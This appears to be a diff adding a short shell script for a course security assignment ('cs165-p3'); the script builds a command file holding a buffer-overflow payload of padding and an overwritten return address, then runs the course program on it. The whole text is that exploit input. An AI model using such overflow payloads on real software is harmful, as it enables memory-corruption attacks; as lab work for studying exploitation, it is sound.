@@ -1,0 +1,4 @@
+rm command-script
+echo -e "add 1 string aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x50\x85\x04\x08 exploit" >> command-script
+echo -e "change 1 hacked! exploit" >> command-script
+./cs165-p3 command-script output.txt
